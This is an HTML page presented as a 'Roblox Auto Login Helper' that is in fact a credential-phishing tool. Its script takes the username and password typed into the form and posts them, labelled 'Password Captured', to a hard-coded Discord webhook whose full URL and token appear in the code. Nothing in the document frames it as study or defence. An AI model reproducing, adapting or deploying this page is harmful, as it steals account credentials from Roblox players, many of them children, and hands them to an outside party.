<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox Auto Login Helper</title>
<style>
body { font-family: Arial; background: #121212; color: #eee; display:flex; flex-direction: column; align-items:center; justify-content:center; height:100vh;}
input { padding: 10px; margin:5px; width:250px; border-radius:5px; border:none;}
button { padding:10px 20px; margin:10px; border-radius:5px; border:none; background:#1a73e8; color:#fff; cursor:pointer;}
#status { margin-top:10px; font-size:16px;}
</style>
</head>
<body>
<h2>Roblox Auto Login Helper</h2>

<input id="username" placeholder="Username / Email">
<input id="password" type="password" placeholder="Password">
<button id="sendBtn">Send to Webhook</button>
<button id="loginBtn">Open Roblox Login Page</button>

<p id="status">Enter credentials and click a button</p>

<script>
const webhookURL = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";

const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const statusEl = document.getElementById("status");

function sendWebhook(username, password) {
    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: "Roblox Login Logger",
            content: `üîê **Password Captured**\nüë§ User: ${username}\nüîë Password: ${password}\nüåç Status: Pending manual login`
        })
    })
    .then(() => statusEl.textContent = "‚úÖ Credentials sent to webhook! Open Roblox to login.")
    .catch(() => statusEl.textContent = "‚ùå Failed to send to webhook!");
}

document.getElementById("sendBtn").addEventListener("click", () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if(!username || !password){
        statusEl.textContent = "‚ùå Enter both username and password!";
        return;
    }
    sendWebhook(username, password);
});

document.getElementById("loginBtn").addEventListener("click", () => {
    window.open("https://www.roblox.com/login", "_blank");
    statusEl.textContent = "‚û°Ô∏è Roblox login page opened. Paste credentials manually.";
});
</script>
</body>
</html>
